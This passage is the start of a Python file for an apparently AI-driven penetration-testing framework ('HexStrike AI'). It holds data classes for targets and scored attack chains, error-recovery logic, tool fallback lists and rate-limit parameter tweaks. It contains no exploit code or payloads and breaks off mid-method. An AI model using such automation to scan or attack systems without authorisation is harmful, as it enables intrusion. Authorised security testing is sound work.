#!/usr/bin/env python3
"""
HexStrike AI - Advanced Penetration Testing Framework v6.0
Enhanced with modular architecture, modern visual engine, and 100+ security tools integration

Features:
- Modular architecture following DRY & SOLID principles
- AI-powered tool selection and parameter optimization
- Modern visual interface with cyber-themed styling
- Intelligent error handling and recovery
- Comprehensive tool coverage (100+ security tools)
- Bug bounty and CTF workflow automation
- Real-time process monitoring and management
- Advanced caching and performance optimization
- Backward compatibility through compatibility shims

Architecture designed for AI-powered intelligence and automation.
"""

import os
import sys
import json
import time
import logging
import subprocess
import threading
import signal
import shutil
import hashlib
import sqlite3
import requests
import socket
import ipaddress
import urllib.parse
import re
import queue
import venv
import base64
import pickle
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Any, List, Optional, Set, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
from functools import wraps
from collections import defaultdict, deque, OrderedDict
from concurrent.futures import ThreadPoolExecutor
import psutil
import asyncio
import concurrent.futures
from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

# Import modular components
try:
    sys.path.insert(0, str(Path(__file__).parent / "src"))
    
    from hexstrike.platform.logging import configure_logging, LogConfig
    from hexstrike.platform.constants import API_HOST, API_PORT, COLORS
    from hexstrike.interfaces.visual_engine import VisualEngine
    from hexstrike.services.decision_service import DecisionService
    from hexstrike.services.tool_execution_service import ToolExecutionService
    from hexstrike.services.process_service import ProcessService
    from hexstrike.adapters.flask_adapter import FlaskAdapter
    from hexstrike.adapters.tool_registry import ToolRegistry
    from hexstrike.domain.target_analysis import TargetProfile, TargetType, TechnologyStack
    from hexstrike.platform.errors import ErrorHandler, ErrorType, RecoveryAction
    
    # Configure modular logging
    log_config = LogConfig(
        level="INFO",
        file_path="hexstrike.log",
        console_output=True
    )
    configure_logging(log_config)
    
    MODULAR_MODE = True
    logger = logging.getLogger(__name__)
    logger.info("🚀 HexStrike AI v6.0 - Modular Architecture Loaded")
    
except ImportError as e:
    # Fallback to monolithic mode if modular components not available
    MODULAR_MODE = False
    
    # Configure logging with enhanced formatting
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('hexstrike.log'),
            logging.StreamHandler()
        ]
    )
    logger = logging.getLogger(__name__)
    logger.warning(f"⚠️ Modular components not available ({e}), running in monolithic mode")
    
    # Global configuration for monolithic mode
    API_PORT = 8888
    API_HOST = "127.0.0.1"

# Flask app initialization
app = Flask(__name__)
CORS(app)

try:
    from src.hexstrike.interfaces.visual_engine import ModernVisualEngine
except ImportError:
    # Fallback for compatibility
    class ModernVisualEngine:
        @staticmethod
        def create_banner():
            return "HexStrike AI - Modular components not available"

# ============================================================================
# INTELLIGENT DECISION ENGINE (v6.0 ENHANCEMENT)
# ============================================================================

class TargetType(Enum):
    """Enumeration of different target types for intelligent analysis"""
    WEB_APPLICATION = "web_application"
    NETWORK_HOST = "network_host"
    API_ENDPOINT = "api_endpoint"
    CLOUD_SERVICE = "cloud_service"
    MOBILE_APP = "mobile_app"
    BINARY_FILE = "binary_file"
    UNKNOWN = "unknown"

class TechnologyStack(Enum):
    """Common technology stacks for targeted testing"""
    APACHE = "apache"
    NGINX = "nginx"
    IIS = "iis"
    NODEJS = "nodejs"
    PHP = "php"
    PYTHON = "python"
    JAVA = "java"
    DOTNET = "dotnet"
    WORDPRESS = "wordpress"
    DRUPAL = "drupal"
    JOOMLA = "joomla"
    REACT = "react"
    ANGULAR = "angular"
    VUE = "vue"
    UNKNOWN = "unknown"

@dataclass
class TargetProfile:
    """Comprehensive target analysis profile for intelligent decision making"""
    target: str
    target_type: TargetType = TargetType.UNKNOWN
    ip_addresses: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    services: Dict[int, str] = field(default_factory=dict)
    technologies: List[TechnologyStack] = field(default_factory=list)
    cms_type: Optional[str] = None
    cloud_provider: Optional[str] = None
    security_headers: Dict[str, str] = field(default_factory=dict)
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    subdomains: List[str] = field(default_factory=list)
    endpoints: List[str] = field(default_factory=list)
    attack_surface_score: float = 0.0
    risk_level: str = "unknown"
    confidence_score: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert TargetProfile to dictionary for JSON serialization"""
        return {
            "target": self.target,
            "target_type": self.target_type.value,
            "ip_addresses": self.ip_addresses,
            "open_ports": self.open_ports,
            "services": self.services,
            "technologies": [tech.value for tech in self.technologies],
            "cms_type": self.cms_type,
            "cloud_provider": self.cloud_provider,
            "security_headers": self.security_headers,
            "ssl_info": self.ssl_info,
            "subdomains": self.subdomains,
            "endpoints": self.endpoints,
            "attack_surface_score": self.attack_surface_score,
            "risk_level": self.risk_level,
            "confidence_score": self.confidence_score
        }

@dataclass
class AttackStep:
    """Individual step in an attack chain"""
    tool: str
    parameters: Dict[str, Any]
    expected_outcome: str
    success_probability: float
    execution_time_estimate: int  # seconds
    dependencies: List[str] = field(default_factory=list)
    
class AttackChain:
    """Represents a sequence of attacks for maximum impact"""
    def __init__(self, target_profile: TargetProfile):
        self.target_profile = target_profile
        self.steps: List[AttackStep] = []
        self.success_probability: float = 0.0
        self.estimated_time: int = 0
        self.required_tools: Set[str] = set()
        self.risk_level: str = "unknown"
    
    def add_step(self, step: AttackStep):
        """Add a step to the attack chain"""
        self.steps.append(step)
        self.required_tools.add(step.tool)
        self.estimated_time += step.execution_time_estimate
        
    def calculate_success_probability(self):
        """Calculate overall success probability of the attack chain"""
        if not self.steps:
            self.success_probability = 0.0
            return
        
        # Use compound probability for sequential steps
        prob = 1.0
        for step in self.steps:
            prob *= step.success_probability
        
        self.success_probability = prob
        
    def to_dict(self) -> Dict[str, Any]:
        """Convert AttackChain to dictionary"""
        return {
            "target": self.target_profile.target,
            "steps": [
                {
                    "tool": step.tool,
                    "parameters": step.parameters,
                    "expected_outcome": step.expected_outcome,
                    "success_probability": step.success_probability,
                    "execution_time_estimate": step.execution_time_estimate,
                    "dependencies": step.dependencies
                }
                for step in self.steps
            ],
            "success_probability": self.success_probability,
            "estimated_time": self.estimated_time,
            "required_tools": list(self.required_tools),
            "risk_level": self.risk_level
        }

try:
    from src.hexstrike.services.intelligent_decision_engine import IntelligentDecisionEngine, AttackStep, AttackChain
except ImportError:
    # Fallback for compatibility
    class IntelligentDecisionEngine:
        def __init__(self):
            pass
        def analyze_target(self, target):
            return None

try:
    from hexstrike.services.intelligent_decision_engine import IntelligentDecisionEngine
except ImportError:
    # Fallback for compatibility
    class IntelligentDecisionEngine:
        def __init__(self):
            pass
        def analyze_target(self, target):
            return None


    
    
    
    
    

# Global decision engine instance
decision_engine = IntelligentDecisionEngine()

# ============================================================================
# INTELLIGENT ERROR HANDLING AND RECOVERY SYSTEM (v11.0 ENHANCEMENT)
# ============================================================================

from enum import Enum
from dataclasses import dataclass
from typing import Callable, Union
import traceback
import time
import random

class ErrorType(Enum):
    """Enumeration of different error types for intelligent handling"""
    TIMEOUT = "timeout"
    PERMISSION_DENIED = "permission_denied"
    NETWORK_UNREACHABLE = "network_unreachable"
    RATE_LIMITED = "rate_limited"
    TOOL_NOT_FOUND = "tool_not_found"
    INVALID_PARAMETERS = "invalid_parameters"
    RESOURCE_EXHAUSTED = "resource_exhausted"
    AUTHENTICATION_FAILED = "authentication_failed"
    TARGET_UNREACHABLE = "target_unreachable"
    PARSING_ERROR = "parsing_error"
    UNKNOWN = "unknown"

class RecoveryAction(Enum):
    """Types of recovery actions that can be taken"""
    RETRY_WITH_BACKOFF = "retry_with_backoff"
    RETRY_WITH_REDUCED_SCOPE = "retry_with_reduced_scope"
    SWITCH_TO_ALTERNATIVE_TOOL = "switch_to_alternative_tool"
    ADJUST_PARAMETERS = "adjust_parameters"
    ESCALATE_TO_HUMAN = "escalate_to_human"
    GRACEFUL_DEGRADATION = "graceful_degradation"
    ABORT_OPERATION = "abort_operation"

@dataclass
class ErrorContext:
    """Context information for error handling decisions"""
    tool_name: str
    target: str
    parameters: Dict[str, Any]
    error_type: ErrorType
    error_message: str
    attempt_count: int
    timestamp: datetime
    stack_trace: str
    system_resources: Dict[str, Any]
    previous_errors: List['ErrorContext'] = field(default_factory=list)

@dataclass
class RecoveryStrategy:
    """Recovery strategy with configuration"""
    action: RecoveryAction
    parameters: Dict[str, Any]
    max_attempts: int
    backoff_multiplier: float
    success_probability: float
    estimated_time: int  # seconds

class IntelligentErrorHandler:
    """Advanced error handling with automatic recovery strategies"""
    
    def __init__(self):
        self.error_patterns = self._initialize_error_patterns()
        self.recovery_strategies = self._initialize_recovery_strategies()
        self.tool_alternatives = self._initialize_tool_alternatives()
        self.parameter_adjustments = self._initialize_parameter_adjustments()
        self.error_history = []
        self.max_history_size = 1000
        
    def _initialize_error_patterns(self) -> Dict[str, ErrorType]:
        """Initialize error pattern recognition"""
        return {
            # Timeout patterns
            r"timeout|timed out|connection timeout|read timeout": ErrorType.TIMEOUT,
            r"operation timed out|command timeout": ErrorType.TIMEOUT,
            
            # Permission patterns
            r"permission denied|access denied|forbidden|not authorized": ErrorType.PERMISSION_DENIED,
            r"sudo required|root required|insufficient privileges": ErrorType.PERMISSION_DENIED,
            
            # Network patterns
            r"network unreachable|host unreachable|no route to host": ErrorType.NETWORK_UNREACHABLE,
            r"connection refused|connection reset|network error": ErrorType.NETWORK_UNREACHABLE,
            
            # Rate limiting patterns
            r"rate limit|too many requests|throttled|429": ErrorType.RATE_LIMITED,
            r"request limit exceeded|quota exceeded": ErrorType.RATE_LIMITED,
            
            # Tool not found patterns
            r"command not found|no such file or directory|not found": ErrorType.TOOL_NOT_FOUND,
            r"executable not found|binary not found": ErrorType.TOOL_NOT_FOUND,
            
            # Parameter patterns
            r"invalid argument|invalid option|unknown option": ErrorType.INVALID_PARAMETERS,
            r"bad parameter|invalid parameter|syntax error": ErrorType.INVALID_PARAMETERS,
            
            # Resource patterns
            r"out of memory|memory error|disk full|no space left": ErrorType.RESOURCE_EXHAUSTED,
            r"resource temporarily unavailable|too many open files": ErrorType.RESOURCE_EXHAUSTED,
            
            # Authentication patterns
            r"authentication failed|login failed|invalid credentials": ErrorType.AUTHENTICATION_FAILED,
            r"unauthorized|invalid token|expired token": ErrorType.AUTHENTICATION_FAILED,
            
            # Target patterns
            r"target unreachable|target not responding|target down": ErrorType.TARGET_UNREACHABLE,
            r"host not found|dns resolution failed": ErrorType.TARGET_UNREACHABLE,
            
            # Parsing patterns
            r"parse error|parsing failed|invalid format|malformed": ErrorType.PARSING_ERROR,
            r"json decode error|xml parse error|invalid json": ErrorType.PARSING_ERROR
        }
    
    def _initialize_recovery_strategies(self) -> Dict[ErrorType, List[RecoveryStrategy]]:
        """Initialize recovery strategies for different error types"""
        return {
            ErrorType.TIMEOUT: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 5, "max_delay": 60},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.7,
                    estimated_time=30
                ),
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_REDUCED_SCOPE,
                    parameters={"reduce_threads": True, "reduce_timeout": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=45
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"prefer_faster_tools": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=60
                )
            ],
            ErrorType.PERMISSION_DENIED: [
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Privilege escalation required", "urgency": "medium"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"require_no_privileges": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.5,
                    estimated_time=30
                )
            ],
            ErrorType.NETWORK_UNREACHABLE: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 10, "max_delay": 120},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.6,
                    estimated_time=60
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"prefer_offline_tools": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.4,
                    estimated_time=30
                )
            ],
            ErrorType.RATE_LIMITED: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 30, "max_delay": 300},
                    max_attempts=5,
                    backoff_multiplier=1.5,
                    success_probability=0.9,
                    estimated_time=180
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"reduce_rate": True, "increase_delays": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=120
                )
            ],
            ErrorType.TOOL_NOT_FOUND: [
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"find_equivalent": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=15
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Tool installation required", "urgency": "low"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=600
                )
            ],
            ErrorType.INVALID_PARAMETERS: [
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"use_defaults": True, "remove_invalid": True},
                    max_attempts=3,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=10
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"simpler_interface": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=30
                )
            ],
            ErrorType.RESOURCE_EXHAUSTED: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_REDUCED_SCOPE,
                    parameters={"reduce_memory": True, "reduce_threads": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=60
                ),
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 60, "max_delay": 300},
                    max_attempts=2,
                    backoff_multiplier=2.0,
                    success_probability=0.5,
                    estimated_time=180
                )
            ],
            ErrorType.AUTHENTICATION_FAILED: [
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Authentication credentials required", "urgency": "high"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"no_auth_required": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.4,
                    estimated_time=30
                )
            ],
            ErrorType.TARGET_UNREACHABLE: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 15, "max_delay": 180},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.6,
                    estimated_time=90
                ),
                RecoveryStrategy(
                    action=RecoveryAction.GRACEFUL_DEGRADATION,
                    parameters={"skip_target": True, "continue_with_others": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=1.0,
                    estimated_time=5
                )
            ],
            ErrorType.PARSING_ERROR: [
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"change_output_format": True, "add_parsing_flags": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=20
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"better_output_format": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=30
                )
            ],
            ErrorType.UNKNOWN: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 5, "max_delay": 30},
                    max_attempts=2,
                    backoff_multiplier=2.0,
                    success_probability=0.3,
                    estimated_time=45
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Unknown error encountered", "urgency": "medium"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                )
            ]
        }
    
    def _initialize_tool_alternatives(self) -> Dict[str, List[str]]:
        """Initialize alternative tools for fallback scenarios"""
        return {
            # Network scanning alternatives
            "nmap": ["rustscan", "masscan", "zmap"],
            "rustscan": ["nmap", "masscan"],
            "masscan": ["nmap", "rustscan", "zmap"],
            
            # Directory/file discovery alternatives
            "gobuster": ["feroxbuster", "dirsearch", "ffuf", "dirb"],
            "feroxbuster": ["gobuster", "dirsearch", "ffuf"],
            "dirsearch": ["gobuster", "feroxbuster", "ffuf"],
            "ffuf": ["gobuster", "feroxbuster", "dirsearch"],
            
            # Vulnerability scanning alternatives
            "nuclei": ["jaeles", "nikto", "w3af"],
            "jaeles": ["nuclei", "nikto"],
            "nikto": ["nuclei", "jaeles", "w3af"],
            
            # Web crawling alternatives
            "katana": ["gau", "waybackurls", "hakrawler"],
            "gau": ["katana", "waybackurls", "hakrawler"],
            "waybackurls": ["gau", "katana", "hakrawler"],
            
            # Parameter discovery alternatives
            "arjun": ["paramspider", "x8", "ffuf"],
            "paramspider": ["arjun", "x8"],
            "x8": ["arjun", "paramspider"],
            
            # SQL injection alternatives
            "sqlmap": ["sqlninja", "jsql-injection"],
            
            # XSS testing alternatives
            "dalfox": ["xsser", "xsstrike"],
            
            # Subdomain enumeration alternatives
            "subfinder": ["amass", "assetfinder", "findomain"],
            "amass": ["subfinder", "assetfinder", "findomain"],
            "assetfinder": ["subfinder", "amass", "findomain"],
            
            # Cloud security alternatives
            "prowler": ["scout-suite", "cloudmapper"],
            "scout-suite": ["prowler", "cloudmapper"],
            
            # Container security alternatives
            "trivy": ["clair", "docker-bench-security"],
            "clair": ["trivy", "docker-bench-security"],
            
            # Binary analysis alternatives
            "ghidra": ["radare2", "ida", "binary-ninja"],
            "radare2": ["ghidra", "objdump", "gdb"],
            "gdb": ["radare2", "lldb"],
            
            # Exploitation alternatives
            "pwntools": ["ropper", "ropgadget"],
            "ropper": ["ropgadget", "pwntools"],
            "ropgadget": ["ropper", "pwntools"]
        }
    
    def _initialize_parameter_adjustments(self) -> Dict[str, Dict[ErrorType, Dict[str, Any]]]:
        """Initialize parameter adjustments for different error types and tools"""
        return {
            "nmap": {
                ErrorType.TIMEOUT: {"timing": "-T2", "reduce_ports": True},
                ErrorType.RATE_LIMITED: {"timing": "-T1", "delay": "1000ms"},
                ErrorType.RESOURCE_EXHAUSTED: {"max_parallelism": "10"}
            },
            "gobuster": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30s"},
                ErrorType.RATE_LIMITED: {"threads": "5", "delay": "1s"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            },
            "nuclei": {
                ErrorType.TIMEOUT: {"concurrency": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"rate-limit": "10", "concurrency": "5"},
                ErrorType.RESOURCE_EXHAUSTED: {"concurrency": "5"}
            },
            "feroxbuster": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"threads": "5", "rate-limit": "10"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            },
            "ffuf": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"threads": "5", "rate": "10"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            }
        }
    
    def classify_error(self, error_message: str, exception: Exception = None) -> ErrorType:
        """Classify error based on message and exception type"""
        error_text = error_message.lower()
        
        # Check exception type first
        if exception:
            if isinstance(exception, TimeoutError):
                return ErrorType.TIMEOUT
            elif isinstance(exception, PermissionError):
                return ErrorType.PERMISSION_DENIED
            elif isinstance(exception, ConnectionError):
                return ErrorType.NETWORK_UNREACHABLE
            elif isinstance(exception, FileNotFoundError):
                return ErrorType.TOOL_NOT_FOUND
        
        # Check error patterns
        for pattern, error_type in self.error_patterns.items():
            if re.search(pattern, error_text, re.IGNORECASE):
                return error_type
        
        return ErrorType.UNKNOWN
    
    def handle_tool_failure(self, tool: str, error: Exception, context: Dict[str, Any]) -> RecoveryStrategy:
        """Determine best recovery action for tool failures"""
        error_message = str(error)
        error_type = self.classify_error(error_message, error)
        
        # Create error context
        error_context = ErrorContext(
            tool_name=tool,
            target=context.get('target', 'unknown'),
            parameters=context.get('parameters', {}),
            error_type=error_type,
            error_message=error_message,
            attempt_count=context.get('attempt_count', 1),
            timestamp=datetime.now(),
            stack_trace=traceback.format_exc(),
            system_resources=self._get_system_resources()
        )
        
        # Add to error history
        self._add_to_history(error_context)
        
        # Get recovery strategies for this error type
        strategies = self.recovery_strategies.get(error_type, self.recovery_strategies[ErrorType.UNKNOWN])
        
        # Select best strategy based on context
        best_strategy = self._select_best_strategy(strategies, error_context)
        
        error_message = f'{error_type.value} - Applying {best_strategy.action.value}'
        logger.warning(f"{ModernVisualEngine.format_error_card('RECOVERY', tool, error_message)}")
        
        return best_strategy
    
    def _select_best_strategy(self, strategies: List[RecoveryStrategy], context: ErrorContext) -> RecoveryStrategy:
        """Select the best recovery strategy based on context"""
        # Filter strategies based on attempt count
        viable_strategies = [s for s in strategies if context.attempt_count <= s.max_attempts]
        
        if not viable_strategies:
            # If all strategies exhausted, escalate to human
            return RecoveryStrategy(
                action=RecoveryAction.ESCALATE_TO_HUMAN,
                parameters={"message": f"All recovery strategies exhausted for {context.tool_name}", "urgency": "high"},
                max_attempts=1,
                backoff_multiplier=1.0,
                success_probability=0.9,
                estimated_time=300
            )
        
        # Score strategies based on success probability and estimated time
        scored_strategies = []
        for strategy in viable_strategies:
            # Adjust success probability based on previous failures
            adjusted_probability = strategy.success_probability * (0.9 ** (context.attempt_count - 1))
            
            # Prefer strategies with higher success probability and lower time
            score = adjusted_probability - (strategy.estimated_time / 1000.0)
            scored_strategies.append((score, strategy))
        
        # Return strategy with highest score
        scored_strategies.sort(key=lambda x: x[0], reverse=True)
        return scored_strategies[0][1]
    
    def auto_adjust_parameters(self, tool: str, error_type: ErrorType, original_params: Dict[str, Any]) -> Dict[str, Any]:
        """Automatically adjust tool parameters based on error patterns"""
        adjustments = self.parameter_adjustments.get(tool, {}).get(error_type, {})
        
        if not adjustments:
            # Generic adjustments based on error type
            if error_type == ErrorType.TIMEOUT:
                adjustments = {"timeout": "60", "threads": "5"}
            elif error_type == ErrorType.RATE_LIMITED:
                adjustments = {"delay": "2s", "threads": "3"}
            elif error_type == ErrorType.RESOURCE_EXHAUSTED:
                adjustments = {"threads": "3", "memory_limit": "1G"}
        
        # Apply adjustments to original parameters
        adjusted_params = original_params.copy()
        adjusted_params.update(adjustments)
        
        adjustment_info = f'Parameters adjusted: {adjustments}'
        logger.info(f"{ModernVisualEngine.format_tool_status(tool, 'RECOVERY', adjustment_info)}")
        
        return adjusted_params
    
    def get_alternative_tool(self, failed_tool: str, context: Dict[str, Any]) -> Optional[str]:
        """Get alternative tool for failed tool"""
        alternatives = self.tool_alternatives.get(failed_tool, [])
        
        if not alternatives:
            return None
        
        # Filter alternatives based on context requirements
        filtered_alternatives = []
        for alt in alternatives:
            if context.get('require_no_privileges') and alt in ['nmap', 'masscan']:
                continue  # Skip tools that typically require privileges
            if context.get('prefer_faster_tools') and alt in ['amass', 'w3af']:
                continue  # Skip slower tools
            filtered_alternatives.append(alt)
        
        if not filtered_alternatives:
            filtered_alternatives = alternatives
        
        # Return first available alternative
        return filtered_alternatives[0] if filtered_alternatives else None
    
    def escalate_to_human(self, context: ErrorContext, urgency: str = "medium") -> Dict[str, Any]:
        """Escalate complex errors to human operator with full context"""
        escalation_data = {
            "timestamp": context.timestamp.isoformat(),
            "tool": context.tool_name,
            "target": context.target,
            "error_type": context.error_type.value,
            "error_message": context.error_message,
            "attempt_count": context.attempt_count,
            "urgency": urgency,
            "suggested_actions": self._get_human_suggestions(context),
            "context": {
                "parameters": context.parameters,
                "system_resources": context.system_resources,
                "recent_errors": [e.error_message for e in context.previous_errors[-5:]]
            }
        }
        
        # Log escalation with enhanced formatting
        logger.error(f"{ModernVisualEngine.format_error_card('CRITICAL', context.tool_name, context.error_message, 'HUMAN ESCALATION REQUIRED')}")
        logger.error(f"{ModernVisualEngine.format_highlighted_text('ESCALATION DETAILS', 'RED')}")
        logger.error(f"{json.dumps(escalation_data, indent=2)}")
        
        return escalation_data
    
    def _get_human_suggestions(self, context: ErrorContext) -> List[str]:
        """Get human-readable suggestions for error resolution"""
        suggestions = []
        
        if context.error_type == ErrorType.PERMISSION_DENIED:
            suggestions.extend([
                "Run the command with sudo privileges",
                "Check file/directory permissions",
                "Verify user is in required groups"
            ])
        elif context.error_type == ErrorType.TOOL_NOT_FOUND:
            suggestions.extend([
                f"Install {context.tool_name} using package manager",
                "Check if tool is in PATH",
                "Verify tool installation"
            ])
        elif context.error_type == ErrorType.NETWORK_UNREACHABLE:
            suggestions.extend([
                "Check network connectivity",
                "Verify target is accessible",
                "Check firewall rules"
            ])
        elif context.error_type == ErrorType.RATE_LIMITED:
            suggestions.extend([
                "Wait before retrying",
                "Use slower scan rates",
                "Check API rate limits"
            ])
        else:
            suggestions.append("Review error details and logs")
        
        return suggestions
    
    def _get_system_resources(self) -> Dict[str, Any]:
        """Get current system resource information"""
        try:
            return {
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent,
                "load_average": os.getloadavg() if hasattr(os, 'getloadavg') else None,
                "active_processes": len(psutil.pids())
            }
        except Exception:
            return {"error": "Unable to get system resources"}
    
    def _add_to_history(self, error_context: ErrorContext):
        """Add error context to history"""
        self.error_history.append(error_context)
        
        # Maintain history size limit
        if len(self.error_history) > self.max_history_size:
            self.error_history = self.error_history[-self.max_history_size:]
    
    def get_error_statistics(self) -> Dict[str, Any]:
        """Get error statistics for monitoring"""
        if not self.error_history:
            return {"total_errors": 0}
        
        error_counts = {}
        tool_errors = {}
        recent_errors = []
        
        # Count errors by type and tool
        for error in self.error_history:
            error_type = error.error_type.value
            tool = error.tool_name
            
            error_counts[error_type] = error_counts.get(error_type, 0) + 1
            tool_errors[tool] = tool_errors.get(tool, 0) + 1
            
            # Recent errors (last hour)
            if (datetime.now() - error.timestamp).total_seconds() < 3600:
                recent_errors.append({
                    "tool": tool,
                    "error_type": error_type,
                    "timestamp": error.timestamp.isoformat()
                })
        
        return {
            "total_errors": len(self.error_history),
            "error_counts_by_type": error_counts,
            "error_counts_by_tool": tool_errors,
            "recent_errors_count": len(recent_errors),
            "recent_errors": recent_errors[-10:]  # Last 10 recent errors
        }

class GracefulDegradation:
    """Ensure system continues operating even with partial tool failures"""
    
    def __init__(self):
        self.fallback_chains = self._initialize_fallback_chains()
        self.critical_operations = self._initialize_critical_operations()
        
    def _initialize_fallback_chains(self) -> Dict[str, List[List[str]]]:
        """Initialize fallback tool chains for critical operations"""
        return {
            "network_discovery": [
                ["nmap", "rustscan", "masscan"],
                ["rustscan", "nmap"],
                ["ping", "telnet"]  # Basic fallback
            ],
            "web_discovery": [
                ["gobuster", "feroxbuster", "dirsearch"],
                ["feroxbuster", "ffuf"],
                ["curl", "wget"]  # Basic fallback
            ],
            "vulnerability_scanning": [
                ["nuclei", "jaeles", "nikto"],
                ["nikto", "w3af"],
                ["curl"]  # Basic manual testing
            ],
            "subdomain_enumeration": [
                ["subfinder", "amass", "assetfinder"],
                ["amass", "findomain"],
                ["dig", "nslookup"]  # Basic DNS tools
            ],
            "parameter_discovery": [
                ["arjun", "paramspider", "x8"],
                ["ffuf", "wfuzz"],
                ["manual_testing"]  # Manual parameter testing
            ]
        }
    
    def _initialize_critical_operations(self) -> Set[str]:
        """Initialize set of critical operations that must not fail completely"""
        return {
            "network_discovery",
            "web_discovery", 
            "vulnerability_scanning",
            "subdomain_enumeration"
        }
    
    def create_fallback_chain(self, operation: str, failed_tools: List[str] = None) -> List[str]:
        """Create fallback tool chain for critical operations"""
        if failed_tools is None:
            failed_tools = []
        
        chains = self.fallback_chains.get(operation, [])
        
        # Find first chain that doesn't contain failed tools
        for chain in chains:
            viable_chain = [tool for tool in chain if tool not in failed_tools]
            if viable_chain:
                logger.info(f"🔄 Fallback chain for {operation}: {viable_chain}")
                return viable_chain
        
        # If no viable chain found, return basic fallback
        basic_fallbacks = {
            "network_discovery": ["ping"],
            "web_discovery": ["curl"],
            "vulnerability_scanning": ["curl"],
            "subdomain_enumeration": ["dig"]
        }
        
        fallback = basic_fallbacks.get(operation, ["manual_testing"])
        logger.warning(f"⚠️  Using basic fallback for {operation}: {fallback}")
        return fallback
    
    def handle_partial_failure(self, operation: str, partial_results: Dict[str, Any], 
                             failed_components: List[str]) -> Dict[str, Any]:
